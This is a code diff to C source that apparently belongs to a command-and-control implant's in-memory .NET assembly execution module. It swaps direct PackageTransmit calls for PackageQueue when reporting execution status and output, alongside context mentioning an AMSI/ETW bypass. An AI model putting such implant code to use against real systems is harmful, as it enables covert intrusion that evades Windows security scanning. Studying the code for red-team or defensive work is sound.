@@ -98,7 +98,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
             PUTS( "Amsi already patched" );
             PackageAddInt32( PackageInfo, 2 );
         }
-        PackageTransmit( PackageInfo, NULL, NULL );
+        PackageQueue( PackageInfo );
     } */
 
     /* if Amsi/Etw bypass is enabled */
@@ -141,7 +141,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
             return FALSE;
         }
 
-        PackageTransmit( PackageInfo, NULL, NULL );
+        PackageQueue( PackageInfo );
         PackageInfo = NULL;
 #endif
     }
@@ -156,7 +156,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
     PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
     PackageAddBytes( PackageInfo, Instance.Dotnet->NetVersion.Buffer, Instance.Dotnet->NetVersion.Length );
-    PackageTransmit( PackageInfo, NULL, NULL );
+    PackageQueue( PackageInfo );
 
     RgsBound[ 0 ].cElements    = Assembly.Length;
     RgsBound[ 0 ].lLbound      = 0;
@@ -308,7 +308,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                     PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
                     PackageAddInt32( PackageInfo, DOTNET_INFO_ENTRYPOINT_EXECUTED );
                     PackageAddInt32( PackageInfo, ClientId.UniqueThread );
-                    PackageTransmit( PackageInfo, NULL, NULL );
+                    PackageQueue( PackageInfo );
 
                     // we have successfully invoked the main function of the assembly executable.
                     Instance.Dotnet->Invoked = TRUE;
@@ -349,7 +349,7 @@ VOID DotnetPushPipe()
 
             PPACKAGE Package = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_OUTPUT );
             PackageAddBytes( Package, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length );
-            PackageTransmit( Package, NULL, NULL );
+            PackageQueue( Package );
 
             if ( Instance.Dotnet->Output.Buffer )
             {
@@ -379,7 +379,7 @@ VOID DotnetPush()
 
             Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
             PackageAddInt32( Package, DOTNET_INFO_FINISHED );
-            PackageTransmit( Package, NULL, NULL );
+            PackageQueue( Package );
 
             PUTS( "Dotnet Invoke thread isn't active anymore." )
             Close = TRUE;
